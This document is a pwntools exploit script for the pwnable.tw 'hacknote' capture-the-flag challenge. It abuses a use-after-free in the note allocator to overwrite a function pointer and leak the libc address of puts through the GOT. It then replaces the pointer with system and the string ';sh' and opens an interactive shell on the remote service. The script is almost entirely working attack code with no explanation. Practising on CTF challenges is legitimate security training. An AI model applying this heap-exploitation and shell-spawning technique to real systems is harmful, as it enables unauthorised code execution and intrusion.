#!/usr/bin/python3
from pwn import *

PATH = "./hacknote"
HOST, PORT = "chall.pwnable.tw", 10102
SSL = False

exe = context.binary = ELF(PATH, checksec=False)
libc = ELF("libc_32.so.6", checksec=False)
context.terminal = ['tmux', 'splitw', '-h', '-p', '57']

info = lambda x, msg="Test": log.info(msg + ": " + hex(x)) or x
s = lambda data: sleep(0.1) or p.send(data)
sl = lambda data=b"": sleep(0.1) or p.sendline(data)
sa = lambda msg, data: p.sendafter(msg, data)
sla = lambda msg, data=b"": p.sendlineafter(msg, data)
sn = lambda num=0: sleep(0.1) or p.sendline(str(num).encode())
sna = lambda msg, num=0: p.sendlineafter(msg, str(num).encode())

gs = f'''

#b*$_base()+0x00000000000014E8
#b*0x08048A33
b*0x0804893D
commands
    x/20a 0x0804A050
end
c
'''

def conn():
    if args.REMOTE:
        return remote(HOST, PORT, ssl=SSL)
    else: 
        return process(exe.path)
def GDB():
    if args.GDB:
        gdb.attach(p, gdbscript=gs)
    #sleep(1)

p = conn()
GDB()

def choice(n):
    sna(b"Your choice :", n)

def add1(size, content=b"content"):
    choice(1)
    sna(b"Note size :", size)
    sa(b"Content :", content)

def delete2(index):
    choice(2)
    sna(b"Index :", index)

def print3(index):
    choice(3)
    sna(b"Index :", index)

print_func = 0x0804862B

add1(16)
add1(16)
delete2(0)
delete2(1)
add1(8, p32(print_func) + p32(exe.got.puts))
print3(0)

libc_leak = info(u32(p.recv(4)), "libc_leak")
libc.address = info(libc_leak - libc.sym.puts, "libc.address")

delete2(2)
add1(12, p32(libc.sym.system) + b";sh\0")
print3(0)

p.interactive()
